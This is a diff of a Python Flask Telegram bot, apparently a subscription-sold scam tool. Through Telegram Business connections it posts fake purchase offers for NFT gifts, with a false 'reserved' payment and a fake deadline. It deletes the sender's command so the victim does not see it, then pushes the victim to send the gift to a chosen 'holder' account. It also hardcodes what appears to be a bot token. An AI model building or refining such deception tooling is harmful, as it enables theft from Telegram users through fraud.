@@ -1,133 +1,73 @@
 """
-Sulumi Team Bot — Hard Delete Rewrite
+Sulumi Team Bot — Final Clean Version
 """
 
-import os
-import re
-import uuid
-import time
-import sqlite3
-import requests
-from collections import deque
+import os, re, uuid, time, sqlite3, requests
 from flask import Flask, request, jsonify
 
 app = Flask(__name__)
 
-# ==================== КОНФИГ ====================
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "9021246143:AAF0SsyX81BAHC-myqxc2vN00JcFPGpgKhk")
 OWNER_ID = int(os.environ.get("OWNER_ID", "7092015279"))
 PAYMENT = os.environ.get("PAYMENT", "golda11123")
 API = f"https://api.telegram.org/bot{BOT_TOKEN}"
-RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://sulumi-bot.onrender.com")
+RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL")
 
-print("=== BOT STARTING ===")
-
-# ==================== EMOJI ====================
 E = {
-    "stars": "5958376256788502078",
-    "grams": "6006074913742396956",
-    "decline": "5778527486270770928",
-    "accept": "5776375003280838798",
-    "forward": "5832251986635920010",
-    "check": "6019523512908124649"
+    "stars": "5958376256788502078", "grams": "6006074913742396956",
+    "decline": "5778527486270770928", "accept": "5776375003280838798",
+    "forward": "5832251986635920010", "check": "6019523512908124649"
 }
 
-def ce(name, fallback):
-    return f'<tg-emoji emoji-id="{E[name]}">{fallback}</tg-emoji>'
+def ce(name, fb): return f'<tg-emoji emoji-id="{E[name]}">{fb}</tg-emoji>'
+def btn(t, d, e): return {"text": t, "callback_data": d, "icon_custom_emoji_id": E[e]}
+def btn_url(t, u, e): return {"text": t, "url": u, "icon_custom_emoji_id": E[e]}
 
-def btn(text, data, emoji):
-    return {"text": text, "callback_data": data, "icon_custom_emoji_id": E[emoji]}
-
-def btn_url(text, url, emoji):
-    return {"text": text, "url": url, "icon_custom_emoji_id": E[emoji]}
-
-# ==================== БАЗА ДАННЫХ ====================
-DB_PATH = "sulumi_bot.db"
-
-def init_db():
-    conn = sqlite3.connect(DB_PATH)
+# БАЗА ДАННЫХ
+DB = "sulumi.db"
+def db_init():
+    conn = sqlite3.connect(DB)
     c = conn.cursor()
-    c.execute('CREATE TABLE IF NOT EXISTS subscribers (user_id INTEGER PRIMARY KEY, expires_at REAL)')
-    c.execute('INSERT OR IGNORE INTO subscribers (user_id, expires_at) VALUES (?, ?)', (OWNER_ID, -1.0))
+    c.execute('CREATE TABLE IF NOT EXISTS subs (uid INTEGER PRIMARY KEY, exp REAL)')
+    c.execute('INSERT OR IGNORE INTO subs (uid, exp) VALUES (?, ?)', (OWNER_ID, -1))
     conn.commit()
     conn.close()
 
-def is_allowed(uid):
-    try:
-        conn = sqlite3.connect(DB_PATH)
-        c = conn.cursor()
-        c.execute('SELECT expires_at FROM subscribers WHERE user_id = ?', (uid,))
-        row = c.fetchone()
-        conn.close()
-        if not row: return False
-        if row[0] == -1.0: return True
-        return row[0] > time.time()
-    except:
-        return False
-
-def add_subscription(uid, days):
-    conn = sqlite3.connect(DB_PATH)
+def db_check(uid):
+    conn = sqlite3.connect(DB)
     c = conn.cursor()
-    expires = -1.0 if days == -1 else time.time() + (days * 86400)
-    c.execute('INSERT OR REPLACE INTO subscribers (user_id, expires_at) VALUES (?, ?)', (uid, expires))
+    c.execute('SELECT exp FROM subs WHERE uid=?', (uid,))
+    r = c.fetchone()
+    conn.close()
+    return r and (r[0] == -1 or r[0] > time.time())
+
+def db_add(uid, days):
+    conn = sqlite3.connect(DB)
+    c = conn.cursor()
+    exp = -1.0 if days == -1 else time.time() + days * 86400
+    c.execute('INSERT OR REPLACE INTO subs (uid, exp) VALUES (?, ?)', (uid, exp))
     conn.commit()
     conn.close()
 
-def get_expires_str(uid):
+def db_exp(uid):
+    conn = sqlite3.connect(DB)
+    c = conn.cursor()
+    c.execute('SELECT exp FROM subs WHERE uid=?', (uid,))
+    r = c.fetchone()
+    conn.close()
+    if not r or r[0] == -1: return "Навсегда"
+    return time.strftime("%d.%m.%Y", time.localtime(r[0]))
+
+db_init()
+
+deals, users, bconns = {}, {}, {}
+wholder, wlang, wcur = set(), set(), set()
+
+def api(m, **p):
     try:
-        conn = sqlite3.connect(DB_PATH)
-        c = conn.cursor()
-        c.execute('SELECT expires_at FROM subscribers WHERE user_id = ?', (uid,))
-        row = c.fetchone()
-        conn.close()
-        if not row or row[0] == -1.0: return "Навсегда"
-        return time.strftime("%d.%m.%Y %H:%M", time.localtime(row[0]))
-    except:
-        return "Неизвестно"
-
-init_db()
-
-# ==================== ХРАНИЛИЩА ====================
-deals = {}
-users = {}
-bconns = {}
-wholder = set()
-wlang = set()
-wcur = set()
-rlog = deque()
-rwait = 0
-
-# ==================== API ====================
-def api(method, **p):
-    global rwait
-    now = time.time()
-    if rwait > 0:
-        time.sleep(rwait)
-        rwait = 0
-        rlog.clear()
-    while rlog and rlog[0] < now - 1:
-        rlog.popleft()
-    if len(rlog) >= 25:
-        time.sleep(1.0 - (now - rlog[0]))
-    rlog.append(time.time())
-    try:
-        r = requests.post(API + "/" + method, json=p, timeout=60)
-        d = r.json()
-        if not d.get("ok") and d.get("error_code") == 429:
-            rwait = d.get("parameters", {}).get("retry_after", 5)
-            return api(method, **p)
-        return d
-    except Exception as e:
-        print(f"API ERR {method}: {e}")
-        return {}
-
-def fmt(n):
-    return f"{int(n):,}".replace(",", " ")
-
-def gs(uid):
-    if uid not in users:
-        users[uid] = {"lang": "ru", "cur": "stars", "hold": PAYMENT}
-    return users[uid]
+        r = requests.post(f"{API}/{m}", json=p, timeout=30)
+        return r.json()
+    except: return {}
 
 def sm(cid, txt, kb=None, bci=None):
     d = {"chat_id": cid, "text": txt, "parse_mode": "HTML"}
@@ -135,257 +75,218 @@ def sm(cid, txt, kb=None, bci=None):
     if bci: d["business_connection_id"] = bci
     return api("sendMessage", **d)
 
-def sm_nft(cid, txt, nft_url, kb=None, bci=None):
+def sm_nft(cid, txt, url, kb=None, bci=None):
     d = {"chat_id": cid, "text": txt, "parse_mode": "HTML",
-         "link_preview_options": {"is_disabled": False, "show_above_text": True, "url": nft_url}}
+         "link_preview_options": {"is_disabled": False, "show_above_text": True, "url": url}}
     if kb: d["reply_markup"] = kb
     if bci: d["business_connection_id"] = bci
     return api("sendMessage", **d)
 
-def em_nft(cid, mid, txt, nft_url, kb=None, bci=None):
-    d = {"chat_id": cid, "message_id": mid, "text": txt, "parse_mode": "HTML",
-         "link_preview_options": {"is_disabled": False, "show_above_text": True, "url": nft_url}}
-    if kb: d["reply_markup"] = kb
+def em(cid, mid, txt, bci=None):
+    d = {"chat_id": cid, "message_id": mid, "text": txt, "parse_mode": "HTML"}
     if bci: d["business_connection_id"] = bci
     return api("editMessageText", **d)
 
-def ac(cb, txt=None, sa=False):
+def dm(cid, mid, bci=None):
+    d = {"chat_id": cid, "message_id": mid}
+    if bci: d["business_connection_id"] = bci
+    return api("deleteMessage", **d)
+
+def ac(cb, t=None, sa=False):
     d = {"callback_query_id": cb, "show_alert": sa}
-    if txt: d["text"] = txt
+    if t: d["text"] = t
     return api("answerCallbackQuery", **d)
 
-# ==================== КЛАВИАТУРЫ ====================
 def okb(did):
-    return {"inline_keyboard": [[btn(" Отклонить", f"decline:{did}", "decline"), btn(" Принять", f"accept:{did}", "accept")]]}
+    return {"inline_keyboard": [[btn("✕ Отклонить", f"decline:{did}", "decline"), btn("✓ Принять", f"accept:{did}", "accept")]]}
 
 def aakb(did, h):
-    clean_h = str(h).replace("@", "").strip()
-    return {"inline_keyboard": [[btn_url(" Передать", f"tg://send_gift?to={clean_h}", "forward")], [btn(" Проверить", f"check:{did}", "check")]]}
+    return {"inline_keyboard": [[btn_url("↗ Передать", f"tg://send_gift?to={h.replace('@','')}", "forward")], [btn("✓ Проверить", f"check:{did}", "check")]]}
 
-# ==================== ПАРСЕР ====================
 def pnft(t):
     m = re.search(r'(?:https?://)?(?:t\.me/nft/)?([A-Za-z0-9]+-\d+)', t, re.I)
     if not m: return None
     s = m.group(1)
     np2, num = s.rsplit("-", 1)
     gn = re.sub(r'([a-z])([A-Z])', r'\1 \2', np2)
-    return {"slug": s, "name": gn, "num": num, "nfmt": fmt(num)}
+    return {"slug": s, "name": gn, "num": num, "nfmt": f"{int(num):,}".replace(",", " ")}
 
-# ==================== ОБРАБОТКА СООБЩЕНИЙ ====================
-def process_msg(msg):
+def gs(uid):
+    if uid not in users: users[uid] = {"lang": "ru", "cur": "stars", "hold": PAYMENT}
+    return users[uid]
+
+@app.route("/webhook", methods=["POST"])
+def webhook():
+    u = request.json
+    if not u: return jsonify({"ok": True})
+    
+    if "message" in u: handle_msg(u["message"])
+    elif "business_message" in u: handle_msg(u["business_message"])
+    elif "callback_query" in u: handle_cb(u["callback_query"])
+    elif "business_connection" in u:
+        bc = u["business_connection"]
+        bconns[bc["user"]["id"]] = bc["id"]
+    
+    return jsonify({"ok": True})
+
+def handle_msg(msg):
     try:
-        chat = msg.get("chat", {})
-        from_user = msg.get("from", {})
-        cid = chat.get("id")
-        uid = from_user.get("id")
-        mid = msg.get("message_id")
+        cid = msg["chat"]["id"]
+        uid = msg["from"]["id"]
+        mid = msg["message_id"]
         ci = msg.get("business_connection_id")
+        txt = (msg.get("text") or "").strip()
         
-        if not cid or not uid:
-            return
+        if ci: bconns[uid] = ci
         
-        # Сохраняем текущий business_connection_id
-        if ci:
-            bconns[uid] = ci
-        
-        txt = msg.get("text") or ""
-        txt = txt.strip()
-        
-        if not txt:
-            return
-        
-        # 1. Обработка смены держателя
+        # Режимы ожидания
         if uid in wholder:
             un = txt.lstrip("@").lower()
             if un and " " not in un:
                 gs(uid)["hold"] = un
                 wholder.discard(uid)
-                sm(cid, f"✅ Держатель изменён на @{un}", bci=ci)
-            else:
-                sm(cid, "❌ Неверный формат", bci=ci)
+                sm(cid, f"✅ Держатель: @{un}", bci=ci)
             return
         
-        # 2. Обработка смены языка
         if uid in wlang:
-            lang = txt.lower().strip()
-            if lang in ["ru", "en"]:
-                gs(uid)["lang"] = lang
+            if txt.lower() in ["ru", "en"]:
+                gs(uid)["lang"] = txt.lower()
                 wlang.discard(uid)
-                sm(cid, f"✅ Язык: {'🇷🇺 Русский' if lang == 'ru' else '🇬🇧 English'}", bci=ci)
-            else:
-                sm(cid, "❌ Напиши ru или en", bci=ci)
+                sm(cid, f"✅ Язык: {'🇷🇺 RU' if txt.lower()=='ru' else '🇬🇧 EN'}", bci=ci)
             return
         
-        # 3. Обработка смены валюты
         if uid in wcur:
-            cur = txt.lower().strip()
-            if cur in ["stars", "grams"]:
-                gs(uid)["cur"] = cur
+            if txt.lower() in ["stars", "grams"]:
+                gs(uid)["cur"] = txt.lower()
                 wcur.discard(uid)
-                sm(cid, f"✅ Валюта: {'⭐ Звёзды' if cur == 'stars' else '💎 Грамы'}", bci=ci)
-            else:
-                sm(cid, "❌ Напиши stars или grams", bci=ci)
+                sm(cid, f"✅ Валюта: {'⭐' if txt.lower()=='stars' else '💎'}", bci=ci)
             return
         
-        # 4. Спам-ответ на обычные сообщения (как ты просил, чтобы видеть что бот жив)
-        if not txt.startswith("/"):
-            sm(cid, "⚠️ Напиши /start для меню", bci=ci)
+        # Обычные сообщения - игнор
+        if not txt.startswith("/"): return
+        
+        # Проверка доступа
+        if txt not in ["/start", "/tarifs", "/help"] and uid != OWNER_ID and not db_check(uid):
+            sm(cid, f"🔒 Доступ закрыт. @{PAYMENT}", bci=ci)
             return
         
-        # 5. Проверка доступа
-        public_cmds = ["/start", "/tarifs", "/help"]
-        if txt not in public_cmds and uid != OWNER_ID and not is_allowed(uid):
-            sm(cid, f"🔒 Доступ закрыт. Купите тариф у @{PAYMENT}", bci=ci)
-            return
-        
-        # ===== КОМАНДЫ =====
-        
+        # КОМАНДЫ
         if txt == "/start":
             t = "✨ <b>Sulumi Team Bot</b>\n\n"
             t += "📋 <b>Как купить:</b>\n1. Зайди в ЛС к продавцу\n2. Напиши: <code>/send ссылка цена</code>\n\n"
             t += "📋 <b>Команды:</b>\n/tarifs — Цены\n/settings — Настройки\n/profile — Профиль"
-            if uid == OWNER_ID:
-                t += "\n\n🔐 <b>Админ:</b>\n/add <id> <дни> (-1 навсегда)\n/list — Список"
+            if uid == OWNER_ID: t += "\n\n🔐 <b>Админ:</b>\n/add <id> <дни>\n/list"
             sm(cid, t, bci=ci)
             return
         
         if txt == "/tarifs":
-            t = "💎 <b>Тарифы Sulumi Team</b>\n\n"
-            t += "🥉 <b>1 День</b> — 1 TON\n🥈 <b>3 Дня</b> — 2.5 TON\n🥇 <b>Навсегда</b> — 4.5 TON\n\n"
-            t += f"💳 Для оплаты: отправьте TON и напишите @{PAYMENT} с чеком."
-            sm(cid, t, bci=ci)
+            sm(cid, f"💎 <b>Тарифы</b>\n\n1 День — 1 TON\n3 Дня — 2.5 TON\nНавсегда — 4.5 TON\n\n💳 @{PAYMENT}", bci=ci)
             return
         
         if txt == "/help":
-            sm(cid, "❓ <b>Помощь</b>\n\nЗайди в ЛС к продавцу и напиши:\n<code>/send ссылка цена</code>", bci=ci)
+            sm(cid, "❓ Напиши /send в ЛС продавцу", bci=ci)
             return
         
         if txt == "/profile":
             s = gs(uid)
-            cur_emoji = ce('stars', '⭐') if s['cur'] == 'stars' else ce('grams', '💎')
-            t = f"👤 <b>Профиль</b>\n\n🆔 ID: <code>{uid}</code>\n💱 Валюта: {cur_emoji}\n👑 Держатель: @{s['hold']}\n⏳ Доступ до: <b>{get_expires_str(uid)}</b>"
-            sm(cid, t, bci=ci)
+            ce_ = ce('stars','⭐') if s['cur']=='stars' else ce('grams','💎')
+            sm(cid, f" <b>Профиль</b>\n\nID: <code>{uid}</code>\nВалюта: {ce_}\nДержатель: @{s['hold']}\nДоступ: {db_exp(uid)}", bci=ci)
             return
         
         if txt == "/settings":
             s = gs(uid)
-            lt = "🇷🇺 Русский" if s["lang"] == "ru" else "🇬🇧 English"
-            ct = f"{ce('stars', '⭐')} Звёзды" if s["cur"] == "stars" else f"{ce('grams', '💎')} Грамы"
-            t = f"⚙️ <b>Настройки</b>\n\n🌐 Язык: {lt}\n💱 Валюта: {ct}\n👑 Держатель: @{s['hold']}\n\n<b>Изменение:</b>\n/lg — язык\n/cv — валюта\n/holder <username> — держатель"
-            sm(cid, t, bci=ci)
+            sm(cid, f"⚙️ <b>Настройки</b>\n\nЯзык: {s['lang']}\nВалюта: {s['cur']}\nДержатель: @{s['hold']}\n\n/lg - язык\n/cv - валюта\n/holder - держатель", bci=ci)
             return
         
         if txt == "/lg":
             wlang.add(uid)
-            sm(cid, "🌐 Напиши <b>ru</b> или <b>en</b>", bci=ci)
+            sm(cid, "🌐 ru или en", bci=ci)
             return
         
         if txt == "/cv":
             wcur.add(uid)
-            sm(cid, "💱 Напиши <b>stars</b> или <b>grams</b>", bci=ci)
+            sm(cid, "💱 stars или grams", bci=ci)
             return
         
         if txt.startswith("/holder"):
             wholder.add(uid)
-            sm(cid, "👑 Напишите username держателя БЕЗ @", bci=ci)
+            sm(cid, "👑 Username без @", bci=ci)
             return
         
-        # ===== ГЛАВНОЕ: /send с ЖЁСТКИМ УДАЛЕНИЕМ =====
         if txt.startswith("/send"):
             parts = txt.split()
             if len(parts) < 3:
-                sm(cid, "❌ <b>Формат:</b>\n<code>/send ссылка цена</code>", bci=ci)
+                sm(cid, "❌ /send ссылка цена", bci=ci)
                 return
             
             ni = pnft(" ".join(parts[1:]))
             if not ni:
-                sm(cid, "❌ Не найдена ссылка на NFT", bci=ci)
+                sm(cid, " Не найдена NFT", bci=ci)
                 return
             
-            rest = " ".join(parts[1:]).replace("https://t.me/nft/" + ni["slug"], "").replace("t.me/nft/" + ni["slug"], "").strip()
-            ps = rest.split()
-            pr = None
-            if ps:
-                try: pr = int(ps[0])
-                except: pass
-            
-            if pr is None:
+            rest = " ".join(parts[1:]).replace(ni["slug"], "").strip()
+            try: pr = int(rest.split()[0])
+            except:
                 sm(cid, "❌ Не указана цена", bci=ci)
                 return
             
             s = gs(uid)
-            cs = ce("stars", "⭐") if s["cur"] == "stars" else ce("grams", "💎")
+            cs = ce("stars","⭐") if s["cur"]=="stars" else ce("grams","💎")
             did = str(uuid.uuid4())[:8]
             
-            # Берем ИМЕННО тот business_connection_id, который пришел в этом сообщении
-            current_bci = ci or bconns.get(uid)
-            
-            if not current_bci:
-                sm(cid, "⚠️ Подключи бизнес-аккаунт! @BotFather → Business → Connect", bci=ci)
+            # ВАЖНО: используем business_connection_id из этого сообщения
+            bci_to_use = ci or bconns.get(uid)
+            if not bci_to_use:
+                sm(cid, "⚠️ Подключи бота: @BotFather → Business", bci=ci)
                 return
             
-            deals[did] = {
-                "wid": uid, "lid": cid, "slug": ni["slug"], "name": ni["name"],
-                "num": ni["num"], "price": pr, "cur": s["cur"], "hold": s["hold"],
-                "st": "pending", "bci": current_bci
-            }
+            deals[did] = {"wid": uid, "lid": cid, "slug": ni["slug"], "name": ni["name"],
+                         "num": ni["num"], "price": pr, "cur": s["cur"], "hold": s["hold"],
+                         "st": "pending", "bci": bci_to_use}
             
-            nl = "https://t.me/nft/" + ni["slug"]
-            hidden = '<a href="' + nl + '">\u200b</a>'
-            sender_name = from_user.get('first_name') or from_user.get('username') or "Пользователь"
-            caption = hidden + f"<b>{sender_name}</b> предлагает <b>{pr}</b> {cs} за ваш подарок <b>{ni['name']} #{ni['nfmt']}</b>.\n\nУ вас есть <b>5h 59m</b>, чтобы принять решение."
+            nl = f"https://t.me/nft/{ni['slug']}"
+            hidden = f'<a href="{nl}">\u200b</a>'
+            name = msg['from'].get('first_name') or msg['from'].get('username') or "User"
+            cap = hidden + f"<b>{name}</b> предлагает <b>{pr}</b> {cs} за <b>{ni['name']} #{ni['nfmt']}</b>.\n\n5h 59m на решение."
             
-            # ШАГ 1: Отправляем оффер
-            result = sm_nft(cid, caption, nl, kb=okb(did), bci=current_bci)
+            # Отправляем оффер
+            res = sm_nft(cid, cap, nl, kb=okb(did), bci=bci_to_use)
             
-            if result.get("ok"):
-                # ШАГ 2: ЖЁСТКОЕ УДАЛЕНИЕ исходного сообщения с командой
-                if mid:
-                    print(f"Попытка удалить сообщение {mid} с bci={current_bci}")
-                    del_res = api("deleteMessage", chat_id=cid, message_id=mid, business_connection_id=current_bci)
-                    
-                    if del_res.get("ok"):
-                        print(f"✅ Сообщение {mid} успешно удалено!")
-                    else:
-                        err = del_res.get("description", "Unknown")
-                        print(f"❌ НЕ УДАЛОСЬ УДАЛИТЬ {mid}: {err}")
-                        # Если удалить не вышло, хотя бы заменим текст на галочку, чтобы не мозолило глаза
-                        api("editMessageText", chat_id=cid, message_id=mid, text="✅", parse_mode="HTML", business_connection_id=current_bci)
-            else:
-                sm(cid, f"❌ Ошибка отправки: {result.get('description', 'err')}", bci=ci)
+            if res.get("ok"):
+                # СРАЗУ удаляем команду
+                print(f"Deleting message {mid} with bci={bci_to_use}")
+                del_res = dm(cid, mid, bci=bci_to_use)
+                if not del_res.get("ok"):
+                    print(f"Delete failed: {del_res}")
+                    # Фоллбэк - редактируем
+                    em(cid, mid, "✅", bci=bci_to_use)
             return
         
         if txt.startswith("/add") and uid == OWNER_ID:
             parts = txt.split()
             if len(parts) >= 3:
                 try:
-                    target_uid = int(parts[1])
-                    days = int(parts[2])
-                    add_subscription(target_uid, days)
-                    sm(cid, f"✅ Доступ выдан: {target_uid} на {days} дн.", bci=ci)
+                    tid, days = int(parts[1]), int(parts[2])
+                    db_add(tid, days)
+                    sm(cid, f"✅ Доступ {tid} на {days}д", bci=ci)
                 except Exception as e:
-                    sm(cid, f"❌ Ошибка: {e}", bci=ci)
+                    sm(cid, f"❌ {e}", bci=ci)
             return
         
         if txt == "/list" and uid == OWNER_ID:
-            conn = sqlite3.connect(DB_PATH)
-            c = conn.cursor()
-            c.execute('SELECT user_id, expires_at FROM subscribers')
-            rows = c.fetchall()
+            conn = sqlite3.connect(DB)
+            rows = conn.execute('SELECT uid, exp FROM subs').fetchall()
             conn.close()
-            ul = "\n".join([f"• <code>{r[0]}</code> (до: {get_expires_str(r[0])})" for r in rows])
-            sm(cid, f"📋 <b>Доступы</b>:\n\n{ul}", bci=ci)
+            lst = "\n".join([f"• <code>{r[0]}</code> ({db_exp(r[0])})" for r in rows])
+            sm(cid, f"📋 <b>Доступы</b>\n\n{lst}", bci=ci)
             return
         
-        sm(cid, f"❓ Неизвестная команда: {txt}\nНапиши /start", bci=ci)
-        
     except Exception as e:
-        print(f"!!! CRITICAL ERROR: {e}")
+        print(f"MSG ERROR: {e}")
         import traceback
         traceback.print_exc()
 
-# ==================== ОБРАБОТКА CALLBACK ====================
-def process_cb(cb):
+def handle_cb(cb):
     try:
         cbid = cb["id"]
         uid = cb["from"]["id"]
@@ -395,89 +296,72 @@ def process_cb(cb):
         data = cb.get("data", "")
         ci = msg.get("business_connection_id")
         
-        if data.startswith("check:"):
-            ac(cbid, txt="🔍 Подарок пока не найден.", sa=True)
-            return
         ac(cbid)
+        
+        if data.startswith("check:"):
+            ac(cbid, "🔍 Ищем...", sa=True)
+            return
         
         if data.startswith("accept:"):
             did = data.split(":")[1]
             deal = deals.get(did)
             if not deal or deal["st"] != "pending": return
+            
             deal["st"] = "accepted"
-            cs = ce("stars", "⭐") if deal["cur"] == "stars" else ce("grams", "💎")
-            nf = fmt(deal["num"])
+            cs = ce("stars","⭐") if deal["cur"]=="stars" else ce("grams","💎")
+            nf = f"{int(deal['num']):,}".replace(",", " ")
             h = deal["hold"]
-            nl = "https://t.me/nft/" + deal["slug"]
-            deal_ci = deal.get("bci") or ci
+            nl = f"https://t.me/nft/{deal['slug']}"
+            bci = deal.get("bci") or ci
             
-            hidden = '<a href="' + nl + '">\u200b</a>'
-            txt = hidden + f"<b>{deal['price']}</b> {cs} успешно зарезервированы.\n\nОжидается передача <b>{deal['name']} #{nf}</b> пользователю @{h}.\n\nНажмите «Передать» и отправьте подарок."
+            hidden = f'<a href="{nl}">\u200b</a>'
+            txt = hidden + f"<b>{deal['price']}</b> {cs} зарезервированы.\n\nОтправь <b>{deal['name']} #{nf}</b> пользователю @{h}.\n\nНажми «Передать»."
             
-            result = em_nft(cid, mid, txt, nl, kb=aakb(did, h), bci=deal_ci)
-            if not result.get("ok"):
-                sm_nft(cid, txt, nl, kb=aakb(did, h), bci=deal_ci)
+            res = api("editMessageText", chat_id=cid, message_id=mid, text=txt, parse_mode="HTML",
+                     link_preview_options={"is_disabled": False, "show_above_text": True, "url": nl},
+                     reply_markup=aakb(did, h), business_connection_id=bci)
+            
+            if not res.get("ok"):
+                dm(cid, mid, bci=bci)
+                sm_nft(cid, txt, nl, kb=aakb(did, h), bci=bci)
             return
         
         if data.startswith("decline:"):
             did = data.split(":")[1]
             deal = deals.get(did)
-            deal_ci = deal.get("bci") or ci if deal else ci
+            bci = deal.get("bci") or ci if deal else ci
             if deal: deal["st"] = "declined"
-            
-            d = {"chat_id": cid, "message_id": mid, "text": "❌ Оффер отклонён.", "parse_mode": "HTML"}
-            if deal_ci: d["business_connection_id"] = deal_ci
-            api("editMessageText", **d)
+            em(cid, mid, "❌ Отклонено", bci=bci)
             return
         
     except Exception as e:
-        print(f"!!! CB ERROR: {e}")
-
-# ==================== WEBHOOK ====================
-@app.route("/webhook", methods=["POST"])
-def webhook():
-    try:
-        update = request.json
-        
-        if "message" in update:
-            process_msg(update["message"])
-        elif "business_message" in update:
-            process_msg(update["business_message"])
-        elif "callback_query" in update:
-            process_cb(update["callback_query"])
-        elif "business_connection" in update:
-            bc = update["business_connection"]
-            bconns[bc["user"]["id"]] = bc["id"]
-            print(f"Business connection: {bc['user']['id']} -> {bc['id']}")
-    except Exception as e:
-        print(f"!!! WEBHOOK ERROR: {e}")
-    return jsonify({"ok": True})
+        print(f"CB ERROR: {e}")
 
 @app.route("/")
 def index():
-    return "✅ Sulumi Team Bot is running"
+    return "✅ OK"
 
-def set_webhook():
+def set_wh():
     url = f"{RENDER_URL}/webhook"
-    result = api("setWebhook", url=url, allowed_updates=["message", "callback_query", "business_connection", "business_message"])
-    print(f"Webhook set: {result}")
+    r = api("setWebhook", url=url, allowed_updates=["message","callback_query","business_connection","business_message"])
+    print(f"Webhook: {r}")
 
-def set_commands():
-    commands = [
+def set_cmd():
+    cmds = [
         {"command": "start", "description": "📋 Меню"},
-        {"command": "send", "description": "💎 Создать оффер"},
+        {"command": "send", "description": "💎 Оффер"},
         {"command": "tarifs", "description": "💳 Цены"},
         {"command": "profile", "description": "👤 Профиль"},
-        {"command": "settings", "description": "⚙️ Настройки"},
+        {"command": "settings", "description": "️ Настройки"},
         {"command": "lg", "description": "🌐 Язык"},
         {"command": "cv", "description": "💱 Валюта"}
     ]
-    api("setMyCommands", commands=commands)
+    api("setMyCommands", commands=cmds)
     print("Commands set")
 
 if __name__ == "__main__":
-    set_webhook()
-    set_commands()
+    set_wh()
+    set_cmd()
     port = int(os.environ.get("PORT", 10000))
-    print(f"Starting on port {port}")
+    print(f"Starting on {port}")
     app.run(host="0.0.0.0", port=port)
